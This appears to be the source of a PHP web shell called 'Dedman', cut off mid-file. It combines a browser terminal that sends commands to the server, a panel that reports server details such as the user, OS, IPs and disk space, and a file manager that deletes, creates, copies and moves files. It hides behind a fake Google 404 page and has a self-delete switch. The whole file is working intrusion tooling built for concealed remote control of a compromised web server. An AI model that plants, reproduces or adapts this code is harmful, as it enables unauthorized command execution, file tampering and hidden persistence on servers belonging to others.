if(this.length>1)return this.each(function(){a.fn.terminal.call(a(this),c,a.extend({name:ha.selector},d))});
if(ha.data("terminal"))return ha.data("terminal");
if(0===ha.length)throw sprintf(a.terminal.defaults.strings.invalidSelector,ha.selector);
var ia,ja,ka,la,ma,na,oa,pa=0,qa=[],ra=Z.length(),sa=new k,ta=a.Deferred(),ua=!1,va=a.noop,wa=[],xa=a.extend({},a.terminal.defaults,{name:ha.selector},d||{}),ya=a.terminal.defaults.strings,za=xa.enabled,Aa=!1,Ba=!1,Ca=!0;
a.extend(ha,a.omap({id:function(){return ra},clear:function(){ka.html(""),qa=[];
try{xa.onClear(ha)}catch(a){w(a,"onClear")}return ha.attr({scrollTop:0}),ha},export_view:function(){var b={};
if(a.isFunction(xa.onExport))try{b=xa.onExport()}catch(c){w(c,"onExport")}return a.extend({},{focus:za,mask:Ka.mask(),prompt:ha.get_prompt(),command:ha.get_command(),position:Ka.position(),lines:u(qa),interpreters:Ja.clone()},b)},import_view:function(b){if(ua)throw new Error(sprintf(ya.notWhileLogin,"import_view"));
if(a.isFunction(xa.onImport))try{xa.onImport(b)}catch(c){w(c,"onImport")}return ta.then(function(){ha.set_prompt(b.prompt),ha.set_command(b.command),Ka.position(b.position),Ka.mask(b.mask),b.focus&&ha.focus(),qa=u(b.lines),Ja=b.interpreters,C()}),ha},save_state:function(c,d,e){if("undefined"!=typeof e?$[e]=ha.export_view():$.push(ha.export_view()),a.isArray(X)||(X=[]),c!==b&&!d){var f=[ra,$.length-1,c];
X.push(f),G()}},exec:function(b,c,d){function e(){a.isArray(b)?!function d(){var a=b.shift();
a?ha.exec(a,c).then(d):f.resolve()}():Ba?wa.push([b,c,f]):H(b,c,!0).then(function(){f.resolve(ha)})}var f=d||new a.Deferred;
return"resolved"!=ta.state()?ta.then(e):e(),f.promise()},autologin:function(a,b,c){return ha.trigger("terminal.autologin",[a,b,c]),ha},login:function(b,c,d,e){function f(b,f,h,i){if(f){for(;
ha.level()>g;
)ha.pop();
xa.history&&Ka.history().enable();
var j=ha.prefix_name(!0)+"_";
a.Storage.set(j+"token",f),a.Storage.set(j+"login",b),ua=!1,a.isFunction(d)&&d()}else c?(h||ha.error(ya.wrongPasswordTryAgain),ha.pop().set_mask(!1)):(ua=!1,h||ha.error(ya.wrongPassword),ha.pop().pop()),a.isFunction(e)&&e();
ha.off("terminal.autologin")}if(sa.push([].slice.call(arguments)),ua)throw new Error(sprintf(ya.notWhileLogin,"login"));
if(!a.isFunction(b))throw new Error(ya.loginIsNotAFunction);
if(ua=!0,ha.token()&&1==ha.level()&&!Ca)ua=!1,ha.logout(!0);
else if(ha.token(!0)&&ha.login_name(!0))return ua=!1,a.isFunction(d)&&d(),ha;
xa.history&&Ka.history().disable();
var g=ha.level();
return ha.on("terminal.autologin",function(a,b,c,d){f(b,c,d)}),ha.push(function(a){ha.set_mask(xa.maskChar).push(function(c){try{b.call(ha,a,c,function(b,c){f(a,b,c)})}catch(d){w(d,"AUTH")}},{prompt:ya.password+": ",name:"password"})},{prompt:ya.login+": ",name:"login"}),ha},settings:function(){return xa},commands:function(){return Ja.top().interpreter},setInterpreter:function(){return window.console&&console.warn&&console.warn("This function is deprecated, use set_interpreter insead!"),ha.set_interpreter.apply(ha,arguments)},set_interpreter:function(b,c){function d(){ha.pause(),o(b,!!c,function(b){ha.resume();
var c=Ja.top();
a.extend(c,b),O(!0)})}return"string"==a.type(b)&&c?ha.login(t(b,c),!0,d):d(),ha},greetings:function(){return D(),ha},paused:function(){return Ba},pause:function(b){return va(),!Ba&&Ka&&ta.then(function(){Ba=!0,Ka.disable(),b||Ka.hidden(),a.isFunction(xa.onPause)&&xa.onPause()}),ha},resume:function(){function b(){Ba=!1,Z.front()==ha&&Ka.enable(),Ka.visible();
var b=wa;
wa=[];
for(var c=0;
c<b.length;
++c)ha.exec.apply(ha,b[c]);
ha.trigger("resume");
var d=ga.shift();
d&&d(),x(),a.isFunction(xa.onResume)&&xa.onResume()}return Ba&&Ka&&("resolved"!=ta.state()?ta.then(b):b()),ha},cols:function(){return xa.numChars?xa.numChars:p(ha)},rows:function(){return xa.numRows?xa.numRows:q(ha)},history:function(){return Ka.history()},history_state:function(a){return a?ha.oneTime(1,function(){xa.historyState=!0,$.length?Z.length()>1&&ha.save_state(null):ha.save_state()}):xa.historyState=!1,ha},clear_history_state:function(){return X=[],$=[],ha},next:function(){if(1===Z.length())return ha;
ha.offset().top,ha.height(),ha.scrollTop();
Z.front().disable();
var b=Z.rotate().enable(),c=b.offset().top-50;
a("html,body").animate({scrollTop:c},500);
try{xa.onTerminalChange(b)}catch(d){w(d,"onTerminalChange")}return b},focus:function(a,b){return ta.then(function(){if(1===Z.length())if(a===!1)try{(!b&&xa.onBlur(ha)!==!1||b)&&ha.disable()}catch(c){w(c,"onBlur")}else try{(!b&&xa.onFocus(ha)!==!1||b)&&ha.enable()}catch(c){w(c,"onFocus")}else if(a===!1)ha.next();
else{var d=Z.front();
if(d!=ha&&(d.disable(),!b))try{xa.onTerminalChange(ha)}catch(c){w(c,"onTerminalChange")}Z.set(ha),ha.enable()}}),ha},freeze:function(a){ta.then(function(){a?(ha.disable(),Aa=!0):(Aa=!1,ha.enable())})},frozen:function(){return Aa},enable:function(){return za||Aa||(la===b&&ha.resize(),ta.then(function(){Ka.enable(),za=!0})),ha},disable:function(){return za&&!Aa&&ta.then(function(){za=!1,Ka.disable()}),ha},enabled:function(){return za},signature:function(){var a=ha.cols(),b=15>a?null:35>a?0:55>a?1:64>a?2:75>a?3:4;
return null!==b?W[b].join("\n")+"\n":""},version:function(){return a.terminal.version},cmd:function(){return Ka},get_command:function(){return Ka.get()},set_command:function(a){return ta.then(function(){Ka.set(a)}),ha},insert:function(a){if("string"==typeof a)return ta.then(function(){Ka.insert(a)}),ha;
throw"insert function argument is not a string"},set_prompt:function(b){return ta.then(function(){y("prompt",b)&&(a.isFunction(b)?Ka.prompt(function(a){b(a,ha)}):Ka.prompt(b),Ja.top().prompt=b)}),ha},get_prompt:function(){return Ja.top().prompt},set_mask:function(a){return ta.then(function(){Ka.mask(a===!0?xa.maskChar:a)}),ha},get_output:function(b){return b?qa:a.map(qa,function(b){return a.isFunction(b[0])?b[0]():b[0]}).join("\n")},resize:function(b,c){if(ha.is(":visible")){b&&c&&(ha.width(b),ha.height(c)),b=ha.width(),c=ha.height();
var d=ha.cols(),e=ha.rows();
if(d!==la||e!==ma){la=d,ma=e,C();
var f=Ja.top();
a.isFunction(f.resize)?f.resize(ha):a.isFunction(xa.onResize)&&xa.onResize(ha),oa=c,na=b,x()}}else ha.stopTime("resize"),ha.oneTime(500,"resize",function(){ha.resize(b,c)});
return ha},flush:function(){try{var b;
if(a.each(da,function(c,d){if(d===ea)b=a("<div></div>");
else if(a.isFunction(d)){b.appendTo(ka);
try{d(b)}catch(e){w(e,"USER:echo(finalize)")}}else a("<div/>").html(d).appendTo(b).width("100%")}),xa.outputLimit>=0){var c=0===xa.outputLimit?ha.rows():xa.outputLimit,d=ka.find("div div");
if(d.length>c){var e=d.length-c+1,f=d.slice(0,e),g=f.parent();
f.remove(),g.each(function(){var b=a(this);
b.is(":empty")&&b.remove()})}}ma=q(ha),Da(),xa.scrollOnEcho&&x(),da=[]}catch(h){alert("[Flush] "+v(h)+"\n"+h.stack)}return ha},update:function(a,b){return ta.then(function(){0>a&&(a=qa.length+a),qa[a]?(null===b?qa.splice(a,1):qa[a][0]=b,C()):ha.error("Invalid line number "+a)}),ha},last_index:function(){return qa.length-1},echo:function(b,c){return b=b||"",a.when(b).then(function(b){try{var d=a.extend({flush:!0,raw:xa.raw,finalize:a.noop,keepWords:!1},c||{});
d.flush&&(da=[]),A(b,d),qa.push([b,a.extend(d,{exec:!1})]),d.flush&&ha.flush()}catch(e){alert("[Terminal.echo] "+v(e)+"\n"+e.stack)}}),ha},error:function(b,c){var d=a.terminal.escape_brackets(b).replace(/\\$/,"&#92;
").replace(I,"]$1[[;
;
;
error]");
return ha.echo("[[;
;
;
error]"+d+"]",c)},exception:function(b,c){var d=v(b);
if(c&&(d="&#91;
"+c+"&#93;
: "+d),d&&ha.error(d,{finalize:function(a){a.addClass("exception message")}}),"string"==typeof b.fileName&&(ha.pause(),a.get(b.fileName,function(a){ha.resume();
var c=b.lineNumber-1,d=a.split("\n")[c];
d&&ha.error("["+b.lineNumber+"]: "+d)})),b.stack){var e=a.terminal.escape_brackets(b.stack);
ha.echo(e.split(/\n/g).map(function(a){return"[[;
;
;
error]"+a.replace(I,function(a){return"]"+a+"[[;
;
;
error]"})+"]"}).join("\n"),{finalize:function(a){a.addClass("exception stack-trace")}})}},scroll:function(a){var b;
return a=Math.round(a),ia.prop?(a>ia.prop("scrollTop")&&a>0&&ia.prop("scrollTop",0),b=ia.prop("scrollTop"),ia.scrollTop(b+a)):(a>ia.attr("scrollTop")&&a>0&&ia.attr("scrollTop",0),b=ia.attr("scrollTop"),ia.scrollTop(b+a)),ha},logout:function(a){if(ua)throw new Error(sprintf(ya.notWhileLogin,"logout"));
return ta.then(function(){if(a){var c=sa.pop();
ha.set_token(b,!0),ha.login.apply(ha,c)}else for(;
Ja.size()>0&&!ha.pop();
);
}),ha},token:function(b){return a.Storage.get(ha.prefix_name(b)+"_token")},set_token:function(b,c){var d=ha.prefix_name(c)+"_token";
return"undefined"==typeof b?a.Storage.remove(d,b):a.Storage.set(d,b),ha},get_token:function(b){return a.Storage.get(ha.prefix_name(b)+"_token")},login_name:function(b){return a.Storage.get(ha.prefix_name(b)+"_login")},name:function(){return Ja.top().name},prefix_name:function(a){var b=(xa.name?xa.name+"_":"")+ra;
if(a&&Ja.size()>1){var c=Ja.map(function(a){return a.name}).slice(1).join("_");
c&&(b+="_"+c)}return b},read:function(b,c){var d=new a.Deferred;
return ha.push(function(b){ha.pop(),a.isFunction(c)&&c(b),d.resolve(b)},{prompt:b}),d.promise()},push:function(c,d){return ta.then(function(){d=d||{};
var e={infiniteLogin:!1},f=a.extend({},e,d);
!f.name&&ja&&(f.name=ja.name),f.prompt===b&&(f.prompt=(f.name||">")+" ");
var g=Ja.top();
g&&(g.mask=Ka.mask());
var h=Ba;
o(c,!!d.login,function(b){if(Ja.push(a.extend({},b,f)),a.isArray(b.completion)&&f.completion===!0?Ja.top().completion=b.completion:b.completion||f.completion!==!0||(Ja.top().completion=!1),f.login){var d=a.type(f.login);
"function"==d?ha.login(f.login,f.infiniteLogin,O,f.infiniteLogin?a.noop:ha.pop):("string"==a.type(c)&&"string"==d||"boolean"==d)&&ha.login(t(c,f.login),f.infiniteLogin,O,f.infiniteLogin?a.noop:ha.pop)}else O();
h||ha.resume()})}),ha},pop:function(c){c!==b&&E(c);
ha.token(!0);
if(1==Ja.size()){if(xa.login){if(L(),a.isFunction(xa.onExit))try{xa.onExit(ha)}catch(d){w(d,"onExit")}return!0}ha.error(ya.canExitError)}else{ha.token(!0)&&M();
var e=Ja.pop();
if(O(),ua&&ha.get_prompt()!=ya.login+": "&&(ua=!1),a.isFunction(e.onExit))try{e.onExit(ha)}catch(d){w(d,"onExit")}ha.set_mask(Ja.top().mask)}return ha},option:function(b,c){if("undefined"==typeof c){if("string"==typeof b)return xa[b];
"object"==typeof b&&a.each(b,function(a,b){xa[a]=b})}else xa[b]=c;
return ha},level:function(){return Ja.size()},reset:function(){return ta.then(function(){for(ha.clear();
Ja.size()>1;
)Ja.pop();
Q()}),ha},purge:function(){return ta.then(function(){var b=ha.prefix_name()+"_",c=a.Storage.get(b+"interpreters");
a.each(a.parseJSON(c),function(b,c){a.Storage.remove(c+"_commands"),a.Storage.remove(c+"_token"),a.Storage.remove(c+"_login")}),Ka.purge(),a.Storage.remove(b+"interpreters")}),ha},destroy:function(){return ta.then(function(){Ka.destroy().remove(),ka.remove(),a(document).unbind(".terminal"),a(window).unbind(".terminal"),ha.unbind("click mousewheel mousedown mouseup"),ha.removeData("terminal").removeClass("terminal"),xa.width&&ha.css("width",""),xa.height&&ha.css("height",""),a(window).off("blur",V).off("focus",U),Z.remove(ra)}),ha}},function(a,b){return function(){try{return b.apply(ha,[].slice.apply(arguments))}catch(c){throw"exec"!==a&&"resume"!==a&&w(c,"TERMINAL"),c}}}));
var Da=function(){var a=s(ha);
return function(){a!==s(ha)&&(ha.resize(),a=s(ha))}}();
xa.width&&ha.width(xa.width),xa.height&&ha.height(xa.height);
var Ea=navigator.userAgent.toLowerCase();
if(ia=Ea.match(/(webkit)[ \/]([\w.]+)/)||"body"!=ha[0].tagName.toLowerCase()?ha:a("html"),a(document).bind("ajaxSend.terminal",function(a,b,c){Y.push(b)}),ka=a("<div>").addClass("terminal-output").appendTo(ha),ha.addClass("terminal"),xa.login&&a.isFunction(xa.onBeforeLogin))try{xa.onBeforeLogin(ha)===!1&&(Ca=!1)}catch(Fa){throw w(Fa,"onBeforeLogin"),Fa}var Ga;
xa.login;
if("string"==typeof c)Ga=c;
else if(c instanceof Array)for(var Ha=0,Ia=c.length;
Ia>Ha;
++Ha)if("string"==typeof c[Ha]){Ga=c[Ha];
break}!Ga||"string"!=typeof xa.login&&xa.login!==!0||(xa.login=t(Ga,xa.login)),Z.append(ha);
var Ja,Ka,La;
return o(c,!!xa.login,function(c){function d(b){var c=Z.get()[b[0]];
if(c&&ra==c.id()&&b[2])try{if(Ba){var d=a.Deferred();
return ga.push(function(){return c.exec(b[2]).then(function(a,e){c.save_state(b[2],!0,b[1]),d.resolve()})}),d.promise()}return c.exec(b[2]).then(function(a,d){c.save_state(b[2],!0,b[1])})}catch(e){var f=a.terminal.escape_brackets(command),g="Error while exec with command "+f;
c.error(g).exception(e)}}(xa.completion&&"boolean"!=typeof xa.completion||!xa.completion)&&(c.completion="settings"),Ja=new k(a.extend({name:xa.name,prompt:xa.prompt,keypress:xa.keypress,keydown:xa.keydown,resize:xa.onResize,greetings:xa.greetings,mousewheel:xa.mousewheel},c)),Ka=a("<div/>").appendTo(ha).cmd({prompt:xa.prompt,history:xa.history,historyFilter:xa.historyFilter,historySize:xa.historySize,width:"100%",enabled:za&&!B,keydown:T,keypress:function(b){var c=Ja.top();
return a.isFunction(c.keypress)?c.keypress(b,ha):a.isFunction(xa.keypress)?xa.keypress(b,ha):void 0},onCommandChange:function(b){if(a.isFunction(xa.onCommandChange))try{xa.onCommandChange(b,ha)}catch(c){throw w(c,"onCommandChange"),c}x()},commands:H}),za&&ha.is(":visible")&&!B?ha.focus(b,!0):ha.disable(),ha.oneTime(100,function(){function b(b){var c=a(b.target);
!c.closest(".terminal").length&&ha.enabled()&&xa.onBlur(ha)!==!1&&ha.disable()}a(document).bind("click.terminal",b).bind("contextmenu.terminal",b)});
var e=a(window);
if(B||e.on("focus",U).on("blur",V),B?ha.click(function(){ha.enabled()||Aa?ha.focus(!1):(ha.focus(),Ka.enable())}):!function(){var b=0,c=!1;
ha.mousedown(function(){a(window).mousemove(function(){c=!0,b=0,a(window).unbind("mousemove")})}).mouseup(function(){var d=c;
c=!1,a(window).unbind("mousemove"),d||1!=++b||(b=0,ha.enabled()||Aa||(ha.focus(),Ka.enable()))})}(),ha.delegate(".exception a","click",function(b){var c=a(this).attr("href");
c.match(/:[0-9]+$/)&&(b.preventDefault(),g(c))}),navigator.platform.match(/linux/i)||ha.mousedown(function(a){if(2==a.which){var b=r();
ha.insert(b)}}),ha.is(":visible")&&(la=ha.cols(),Ka.resize(la),ma=q(ha)),xa.login?ha.login(xa.login,!0,Q):Q(),ha.oneTime(100,function(){e.bind("resize.terminal",function(){if(ha.is(":visible")){var a=ha.width(),b=ha.height();
(oa!==b||na!==a)&&ha.resize()}})}),xa.execHash&&location.hash?setTimeout(function(){try{var b=location.hash.replace(/^#/,"");
X=a.parseJSON(decodeURIComponent(b));
var c=0;
!function f(){var a=X[c++];
a?d(a).then(f):_=!0}()}catch(e){}}):_=!0,a.event.special.mousewheel){var f=!1;
a(document).bind("keydown.terminal",function(a){a.shiftKey&&(f=!0)}).bind("keyup.terminal",function(a){(a.shiftKey||16==a.which)&&(f=!1)}),ha.mousewheel(function(b,c){if(!f){var d=Ja.top();
if(a.isFunction(d.mousewheel)){var e=d.mousewheel(b,c,ha);
if(e===!1)return}else a.isFunction(xa.mousewheel)&&xa.mousewheel(b,c,ha);
c>0?ha.scroll(-40):ha.scroll(40)}})}ta.resolve()}),ha.data("terminal",ha),ha}}(jQuery),function(a){a(document).ready(function(){function b(b){b&&("string"==typeof b?s.echo(b):b instanceof Array?s.echo(a.map(b,function(b){return a.json_stringify(b)}).join(" ")):"object"==typeof b?s.echo(a.json_stringify(b)):s.echo(b))}function c(){var a=m.path;
return a&&a.length>l.prompt_path_length&&(a="..."+a.slice(a.length-l.prompt_path_length+3)),"[[b;
#d33682;
]"+(m.user||"user")+"]@[[b;
#6c71c4;
]"+(m.hostname||l.domain||"web-console")+"] "+(a||"~")+"$ "}function d(a){a.set_prompt(c())}function e(b,c){c&&(a.extend(m,c),d(b))}function f(b,c,d,e,f,g){g=a.extend({pause:!0},g),g.pause&&b.pause(),a.jrpc(l.url,c,d,function(c){if(g.pause&&b.resume(),c.error)if(f)f();
else{var d=a.trim(c.error.message||""),h=a.trim(c.error.data||"");
!d&&h&&(d=h,h=""),b.error("&#91;
ERROR&#93;
 RPC: "+(d||"Unknown error")+(h?" ("+h+")":""))}else e&&e(c.result)},function(c,d,e){if(g.pause&&b.resume(),f)f();
else if("abort"!==d){var h=a.trim(c.responseText||"");
b.error("&#91;
ERROR&#93;
 AJAX: "+(d||"Unknown error")+(h?"\nServer reponse:\n"+h:""))}})}function g(a,b,c,d,e,g){var h=a.token();
if(h){var i=[h,m];
c&&c.length&&i.push.apply(i,c),f(a,b,i,d,e,g)}else a.error("&#91;
ERROR&#93;
 Access denied (no authentication token found)")}function h(c,d){if(c=a.trim(c||"")){var f=a.terminal.splitCommand(c),h=null,i=[];
"cd"===f.name.toLowerCase()?(h="cd",i=[f.args.length?f.args[0]:""]):(h="run",i=[c]),h&&g(d,h,i,function(a){e(d,a.environment),b(a.output)})}}function i(c,d,g){c=a.trim(c||""),d=a.trim(d||""),c&&d?f(s,"login",[c,d],function(a){a&&a.token?(m.user=c,e(s,a.environment),b(a.output),g(a.token)):g(null)},function(){g(null)}):g(null)}function j(a,c,d){var e=a.export_view(),f=e.command.substring(0,e.position);
g(a,"completion",[c,f],function(a){b(a.output),a.completion&&a.completion.length&&(a.completion.reverse(),d(a.completion))},null,{pause:!1})}function k(){o=!0;
try{s.clear(),s.logout()}catch(a){}o=!1}var l={url:"",prompt_path_length:32,domain:document.domain||window.location.host,is_small_window:a(document).width()<625?!0:!1},m={user:"",hostname:"",path:""},n="undefined"!=typeof 
<?php echo $NO_LOGIN ? "true" : "false" 
?>?
<?php echo $NO_LOGIN ? "true" : "false" 
?>:!1,o=!1,p="",q="for larva 2.3",r=q+"\n";
l.is_small_window||(p="01000100 01000101 01000100 01001101 01000001 01001110 ",r="\n "+q+"\n");
var s=a("body").terminal(h,{login:n?!1:i,prompt:c(),greetings:n?"":"You are authenticated",tabcompletion:!0,completion:j,onBlur:function(){return!1},exceptionHandler:function(a){o||s.exception(a)}});
n?s.set_token("NO_LOGIN"):(k(),a(window).unload(function(){k()})),p&&s.echo(p),r&&s.echo(r)})}(jQuery);
</script>
 </head>
 <body style="
 background-color: black;
 border: 0px;
" >
 

<!-- style start shere -->
<style>
body {
 margin:0;

 background:#173B0B;

 
}

.floating-box {
 display: inline-block;

 width: 30%;


 height: 30%;

 margin: 10px;

 border: 2px solid #73AD21;
 
}

.after-box {
 border: 3px solid red;
 
}

.topnav {
 overflow: hidden;

 top: 0px;

}

.topnav a {
 float: left;

 display: block;

 color: lime;

 text-align: center;

 padding: 14px 16px;

 text-decoration: none;

 font-size: 17px;

}

.topnav a:hover {
 background-color: lime;

 color: white;

}

.topnav a.active {
 background-color: #4CAF50;

 color: white;

}
#myDIV {
 width: 100%;

 padding: 50px 0;

 text-align: center;

 background-color: grey;

 margin-top: 20px;

}

.sidenav {
 height: 100%;

 width: 0px;

 position: fixed;

 z-index: 1;

 top: 0;

 left: 0;

 background-color: #111;

 overflow-x: hidden;

 transition: 0.5s;

 padding-top: 60px;

}

.sidenav a {
 padding: 8px 8px 8px 32px;

 text-decoration: none;

 font-size: 15px;

 color: #818181;

 display: block;

 transition: 0.3s;

}

.sidenav a:hover {
 color: #f1f1f1;

}

.sidenav .closebtn {
 position: absolute;

 top: 0;

 right: 25px;

 font-size: 36px;

 margin-left: 50px;

}

#main {
 transition: margin-left .5s;

 padding: 16px;

}

@media screen and (max-height: 450px) {
 .sidenav {padding-top: 15px;
}
 .sidenav a {font-size: 10px;
}
}
</style>
<!-- style ends here -->

<div id="mySidenav" class="sidenav">
 <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;
</a>
 <a class="active" style=" color:black;
font-size: 30px;
 color: lime;
" ><b>Dedman</b></a><hr>
 <a style="color: lime;
 ">Server Software :
<?php echo $_SERVER['SERVER_SOFTWARE'];
 
?></a>
 <a style="color: lime;
"> 
<?php echo "Server Time : " . date("Y/m/d h:i:sa") 
?> </a>
 <a style="color: lime;
"> 
<?php $def = round(disk_free_space("/") / 1024 / 1024 / 1024);
 print("Free space: $def GB - ");
 $df = round(disk_total_space("/") / 1024 / 1024 / 1024);
 print("OF : $df GB");
 
?> </a>
 <a style="color: lime;
 "> Operating System: 
<?php echo php_uname();
 
?> </a>
 <a style="color: lime;
 ">Your IP : 
<?php getIp();
 
?> </a>

 <a style="color: lime;
 ">Server IP : 
<?php echo $_SERVER['SERVER_ADDR'].':'.$_SERVER['SERVER_PORT'] ;
 
?> </a>
 <a style="color: lime;
"> PHP Version: 
<?php echo PHP_VERSION 
?></a>
 <a style="color: lime;
 " >SafeMode : 
<?php echo (@ini_get('safe_mode') ? 'on' : 'off') 
?></a>
 <a style="color: lime;
 " >User : 
<?php $esr = system("whoami");

?></a>
 <a style="color: lime;
 " >
<?php echo 'HOST : ' . gethostname();
 
?></a>
 <a style="color: lime;
 " >
 
<?php function _is_curl_installed() { if (in_array ('curl', get_loaded_extensions())) { return true;
 } else { return false;
 } } if (_is_curl_installed()) { echo "CURL : <span style=\"color:lime\">installed</span>";
 } else { echo "CURL : NOT <span style=\"color:red\">installed</span>";
 } 
?>
 <br></a><hr>
</div>

 </div>


<script>
function openNav() {
 document.getElementById("mySidenav").style.width = "100%";

 document.getElementById("main").style.marginLeft = "250px";

}

function closeNav() {
 document.getElementById("mySidenav").style.width = "0";

 document.getElementById("main").style.marginLeft= "0";

}
</script>

<!-- side nav bar ends here -->
<div class='topnav'>
<a><span style="color:white;
background-color: lime;
 font-size: 30px;
 padding: 50px;
" onclick="openNav()">&#9776;
 Dedman</span></a>
<a href='?p=' ><b>[ Shell UI ]</b></a>
<a href="?pinfo" ><b>[ phpinfo ]</b></a
><a href='?sucide' style='float: right;
 color: red;
 '><b>[ Sucide ]</b></a></div> <BR><HR><BR>

 </body>
</html>

<?php } die();
 } 
?>


<?php $use_auth = true;
 define('FM_READONLY', $use_auth && !empty($readonly_users));
 $send_mail = true;
 $use_highlightjs = true;
 $highlightjs_style = 'vs';
 $default_timezone = 'Asia/Kolkata';
 $root_path = $_SERVER['DOCUMENT_ROOT'];
 $root_url = '';
 $http_host = $_SERVER['HTTP_HOST'];
 $iconv_input_encoding = 'CP1251';
 $datetime_format = 'd.m.y H:i';
 $is_https = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https';
 $root_path = rtrim($root_path, '\\/');
 $root_path = str_replace('\\', '/', $root_path);
 if (!@is_dir($root_path)) { echo "<h1>Root path \"{$root_path}\" not found!</h1>";
 exit;
 } $root_url = fm_clean_path($root_url);
 defined('FM_ROOT_PATH') || define('FM_ROOT_PATH', $root_path);
 defined('FM_ROOT_URL') || define('FM_ROOT_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . (!empty($root_url) ? '/' . $root_url : ''));
 defined('FM_SELF_URL') || define('FM_SELF_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . $_SERVER['PHP_SELF']);
 if (isset($_GET['img'])) { fm_show_image($_GET['img']);
 } if (!isset($_GET['p']) and !isset($_GET['terminal']) and !isset($_GET['sucide']) and !isset($_GET['pinfo'])) { echo "
<!DOCTYPE html>
<html lang=en>
 <meta charset=utf-8>
 <meta name=viewport content='initial-scale=1, minimum-scale=1, width=device-width'>
 <title>Error 404 (Not Found)!!1</title>
 <style>
 *{margin:0;
padding:0}html,code{font:15px/22px arial,sans-serif}html{background:#fff;
color:#222;
padding:15px}body{margin:7% auto 0;
max-width:390px;
min-height:180px;
padding:30px 0 15px}* > body{background:url(//www.google.com/images/errors/robot.png) 100% 5px no-repeat;
padding-right:205px}p{margin:11px 0 22px;
overflow:hidden}ins{color:#777;
text-decoration:none}a img{border:0}@media screen and (max-width:772px){body{background:none;
margin-top:0;
max-width:none;
padding-right:0}}#logo{background:url(//www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png) no-repeat;
margin-left:-5px}@media only screen and (min-resolution:192dpi){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat 0% 0%/100% 100%;
-moz-border-image:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) 0}}@media only screen and (-webkit-min-device-pixel-ratio:2){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat;
-webkit-background-size:100% 100%}}#logo{display:inline-block;
height:54px;
width:150px}
 </style>
 <a href=//www.google.com/><span id=logo aria-label=Google></span></a>
 <p><b>404.</b> <ins>That’s an error.</ins>
 <p>The requested URL was not found on this server. <br> <br> <ins>That’s all we know.</ins>
";
 die();
 } define('FM_IS_WIN', DIRECTORY_SEPARATOR == '\\');
 if (isset($_GET['sucide'])) { unlink(__FILE__);
 die();
 } $pinfo = "false";
 if (isset($_GET['pinfo'])) { echo "<center>";
 phpinfo();
 echo "<center>";
 die();
 } if (!isset($_GET['p'])) { fm_redirect("404");
 die();
 } $p = isset($_GET['p']) ? $_GET['p'] : (isset($_POST['p']) ? $_POST['p'] : '');
 $p = fm_clean_path($p);
 define('FM_PATH', $p);
 define('FM_USE_AUTH', $use_auth);
 defined('FM_ICONV_INPUT_ENC') || define('FM_ICONV_INPUT_ENC', $iconv_input_encoding);
 defined('FM_USE_HIGHLIGHTJS') || define('FM_USE_HIGHLIGHTJS', $use_highlightjs);
 defined('FM_HIGHLIGHTJS_STYLE') || define('FM_HIGHLIGHTJS_STYLE', $highlightjs_style);
 defined('FM_DATETIME_FORMAT') || define('FM_DATETIME_FORMAT', $datetime_format);
 unset($p, $use_auth, $iconv_input_encoding, $use_highlightjs, $highlightjs_style);
 if (isset($_POST['ajax']) && !FM_READONLY) { if(isset($_POST['type']) && $_POST['type']=="search") { $dir = $_POST['path'];
 $response = scan($dir);
 echo json_encode($response);
 } if (isset($_POST['type']) && $_POST['type']=="mail") { } if(isset($_POST['type']) && $_POST['type']=="backup") { $file = $_POST['file'];
 $path = $_POST['path'];
 $date = date("dMy-His");
 $newFile = $file.'-'.$date.'.bak';
 copy($path.'/'.$file, $path.'/'.$newFile) or die("Unable to backup");
 echo "Backup $newFile Created";
 } exit;
 } if (isset($_GET['del'])) { $del = $_GET['del'];
 $del = fm_clean_path($del);
 $del = str_replace('/', '', $del);
 if ($del != '' && $del != '..' && $del != '.') { $path = FM_ROOT_PATH;
 if (FM_PATH != '') { $path .= '/' . FM_PATH;
 } $is_dir = is_dir($path . '/' . $del);
 if (fm_rdelete($path . '/' . $del)) { $msg = $is_dir ? 'Folder <b>%s</b> deleted' : 'File <b>%s</b> deleted';
 fm_set_msg(sprintf($msg, $del));
 } else { $msg = $is_dir ? 'Folder <b>%s</b> not deleted' : 'File <b>%s</b> not deleted';
 fm_set_msg(sprintf($msg, $del), 'error');
 } } else { fm_set_msg('Wrong file or folder name', 'error');
 } fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } if (isset($_GET['new'])) { $new = $_GET['new'];
 $new = fm_clean_path($new);
 $new = str_replace('/', '', $new);
 if ($new != '' && $new != '..' && $new != '.') { $path = FM_ROOT_PATH;
 if (FM_PATH != '') { $path .= '/' . FM_PATH;
 } if (fm_mkdir($path . '/' . $new, false) === true) { fm_set_msg(sprintf('Folder <b>%s</b> created', $new));
 } elseif (fm_mkdir($path . '/' . $new, false) === $path . '/' . $new) { fm_set_msg(sprintf('Folder <b>%s</b> already exists', $new), 'alert');
 } else { fm_set_msg(sprintf('Folder <b>%s</b> not created', $new), 'error');
 } } else { fm_set_msg('Wrong folder name', 'error');
 } fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } if (isset($_GET['copy'], $_GET['finish'])) { $copy = $_GET['copy'];
 $copy = fm_clean_path($copy);
 if ($copy == '') { fm_set_msg('Source path not defined', 'error');
 fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } $from = FM_ROOT_PATH . '/' . $copy;
 $dest = FM_ROOT_PATH;
 if (FM_PATH != '') { $dest .= '/' . FM_PATH;
 } $dest .= '/' . basename($from);
 $move = isset($_GET['move']);
 if ($from != $dest) { $msg_from = trim(FM_PATH . '/' . basename($from), '/');
 if ($move) { $rename = fm_rename($from, $dest);
 if ($rename) { fm_set_msg(sprintf('Moved from <b>%s</b> to <b>%s</b>', $copy, $msg_from));
 } elseif ($rename === null) { fm_set_msg('File or folder with this path already exists', 'alert');
